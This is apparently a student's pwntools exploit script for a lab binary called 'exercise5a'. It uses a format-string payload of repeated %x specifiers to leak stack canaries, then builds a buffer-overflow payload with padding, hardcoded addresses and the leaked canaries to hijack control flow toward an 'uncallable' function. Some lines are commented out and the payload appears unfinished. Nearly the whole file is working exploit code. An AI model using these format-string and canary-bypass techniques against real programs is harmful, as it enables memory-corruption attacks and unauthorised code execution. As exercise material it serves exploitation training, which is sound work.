#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401507
b *0x401349
b *0x401351
b *0x0000000000401256
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
uncallable = 0x0000000000401256
back = 0x00007fffffffde40
ret = 0x000000000040101a

previous = 0x00007fffffffdf20
addr1 = 0x00001555555076a0
addr2 = 0x00001555553659c1
after_uncallable = 0x000000ef


#back = 0x30

r = start()
#pause()
# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
r.recvuntil(b"for user 2:\n")
r.sendline(b"%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.")
out = r.recvuntil(b"is not the password\n")
canary_str = out.split(b'.')
canary_one_str = '0x' + canary_str[-2].decode()
canary_two_str = '0x' + canary_str[-3].decode()
print(canary_one_str)
print(canary_two_str)
canary_one_int = int(canary_one_str, 16)
canary_two_int = int(canary_two_str, 16)
#canary_one = p64(canary_one_int)
#canary_two = p64(canary_two_int)
canary_one = p32(canary_one_int)
canary_two = p32(canary_two_int)
print(canary_one_str)
print(canary_one_int)
print(canary_one)
print(canary_two_str)
print(canary_two_int)
print(canary_two)

#r.recvuntil(b"for user 2:\n")
#r.sendline(b'\0'*248)

#shellcode = b'A'*240 + p64(addr1) + p64(addr2) + canary_one + canary_two + p64(previous) + p64(uncallable) + p64(after_uncallable)
shellcode = b'A'*240 + p64(addr1) + p64(addr2) + canary_one + p32(0xfff) + canary_two + p32(0xffff)

r.recvuntil(b"for user 2:\n")
r.sendline(shellcode)
print(r.recvall().decode(errors='ignore'))

